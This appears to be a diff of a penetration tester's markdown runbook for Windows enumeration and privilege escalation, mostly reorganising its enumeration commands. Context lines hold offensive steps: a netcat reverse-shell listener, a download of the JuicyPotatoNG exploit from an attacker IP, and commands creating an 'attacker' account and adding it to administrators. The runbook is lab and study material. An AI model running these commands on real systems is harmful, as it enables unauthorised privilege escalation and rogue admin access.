@@ -14,12 +14,21 @@ This runbook is to help with Windows Enumeration and Privilege Escalation.  It i
     - [Useful reverse shells](#useful-reverse-shells)
   - [Install needed tools](#install-needed-tools)
   - [Enumeration](#enumeration)
-    - [System Info](#system-info)
-    - [Users \& Groups](#users--groups)
-    - [Permissions](#permissions)
-    - [Networking](#networking)
-    - [Logs \& History](#logs--history)
-    - [Installed software](#installed-software)
+    - [System Information](#system-information)
+      - [Hostname](#hostname)
+      - [OS Information](#os-information)
+      - [Processes \& Services](#processes--services)
+      - [Logs \& History](#logs--history)
+      - [Installed software](#installed-software)
+    - [Networking Information](#networking-information)
+      - [Network Resources](#network-resources)
+    - [Basic Domain Information](#basic-domain-information)
+    - [Users \& Groups Information](#users--groups-information)
+      - [Users](#users)
+      - [Groups](#groups)
+      - [Environment Variables](#environment-variables)
+      - [Permissions](#permissions)
+      - [Tasks](#tasks)
   - [Automated Tools](#automated-tools)
     - [WinPEASx64.exe](#winpeasx64exe)
     - [AD Checklist - Run this if you have valid AD creds](#ad-checklist---run-this-if-you-have-valid-ad-creds)
@@ -35,8 +44,6 @@ This runbook is to help with Windows Enumeration and Privilege Escalation.  It i
     - [Capturing configuration file credentials](#capturing-configuration-file-credentials)
   - [Windows Enumeration Tools](#windows-enumeration-tools)
     - [Add users](#add-users)
-  - [Establish tunnel](#establish-tunnel)
-  - [Establish persistance](#establish-persistance)
 
 
 ## Stabilize
@@ -45,6 +52,7 @@ This runbook is to help with Windows Enumeration and Privilege Escalation.  It i
 ```bash
 rlwrap nc -lvnp 443
 ```
+
 ### Useful reverse shells
 
 - Powershell oneliner:
@@ -89,42 +97,160 @@ evil-winrm -i <ip> -u <username> -H <nt_hash>
 
 ## Enumeration
 
-### System Info
+### System Information
 
-- System specific info
+#### Hostname
 
 ```cmd
 - whoami
-- net user
 - systeminfo
 - hostname
+```
+
+#### OS Information
+
+- OS Name
+
+- OS Version
+
+```cmd
+ver
+```
+
+- OS Configuration
+
+- Installed Patches
+
+#### Processes & Services
+
+- Running Processes
+
+```powershell
+- Get-Process
+- Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+- Tasks
+
+```cmd
+- tasklist
+- schtasks
+```
+
+#### Logs & History
+
+- History
+
+```powershell
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+#### Installed software
+
+- View installed software
+32-bit:
+
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+64-bit:
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+- Program Files
+
+```cmd
+dir C:/
+dir "C:/Program Files (x86)"
+dir "C:/Program Files"
+```
+
+### Networking Information
+
+- Host IP
+
+```cmd
 - ipconfig /all
+- netstat -anot
 ```
 
-- see 
+- Available Networks and subnets
 
-### Users & Groups
+```cmd
+- route print
+```
 
-- Users
+- DNS
+
+<!-- more info-->
+
+- Known Hosts
+  
+```cmd
+arp /a
+```
+
+- Host Firewall Configuration
+
+<!-- more info-->
+
+#### Network Resources
+
+- Network Shares
+
+``` powershell
+- net share
+- net view
+```
+
+- Domain Resources
+
+- Network Devices
+
+### Basic Domain Information
+
+- Domain or Workgroup Name
+
+- Logon Server
+
+### Users & Groups Information
+
+#### Users
 
 ```powershell
-- whoami /priv
-# Potato or Print spoofer
-- net user <user>
-- net user /<domain>
-- Get-LocalUser
+# Local User info | Check Potato or Print spoofer
+whoami /priv
+net localgroup
+Get-LocalUser
+# All domain users
+net user /domain
+# User specific info
+net user <user> /domain
 ```
 
-- Groups
+#### Groups
 
 ```powershell
-- whoami /groups
-- Get-LocalGroup
-- Get-LocalGroupMember < LocalGroup >
-- Get-LocalGroupMember administrators
+# Local Group info
+whoami /groups
+Get-LocalGroup
+Get-LocalGroupMember < LocalGroup >
+Get-LocalGroupMember administrators
+# All domain groups
+net group /domain
 ```
 
-### Permissions
+#### Environment Variables
+
+```powershell
+Get-ChildItem -Path Env:
+```
+
+#### Permissions
   
 - Users permissions
   <!--More -->
@@ -146,85 +272,11 @@ evil-winrm -i <ip> -u <username> -H <nt_hash>
 - Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 
 ```
 
-- Mounts and shares
-  
-```cmd
-dir 
-```
+#### Tasks
 
-- ### Processes & Services
+- Running
 
-- Running Processes
-
-```powershell
-- Get-Process
-- Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-```
-
-- Tasks
-
-```cmd
-- tasklist
-- schtasks
-```
-
-### Networking
-
-- Ip info
-
-```cmd
-- ipconfig /all
-- netstat -anot
-```
-
-- Routing info
-
-```cmd
-- route print
-- 
-- Firewalls
-TBD
-```
-  
-### Logs & History
-
-- History
-
-```powershell
-Get-History
-(Get-PSReadlineOption).HistorySavePath
-C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
-- Environment variables:
-
-```powershell
-Get-ChildItem -Path Env:
-```
-
-<!-- Maybe some logs -->
-
-### Installed software
-
-- View installed software
-32-bit:
-
-```powershell
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-```
-
-64-bit:
-```powershell
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-```
-
-- Program Files
-
-```cmd
-dir C:/
-dir "C:/Program Files (x86)"
-dir "C:/Program Files"
-```
+- Scheduled
 
 ## Automated Tools
 
@@ -482,8 +534,6 @@ iwr -uri http://192.168.45.215/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
 ./god.exe -cmd "net user attacker password123! /add" 
 ./god.exe -cmd "net localgroup administrators attacker /add"
 
-## Establish tunnel
 
-## Establish persistance
 
  <!--- Last Updated July 9, 2024 --->
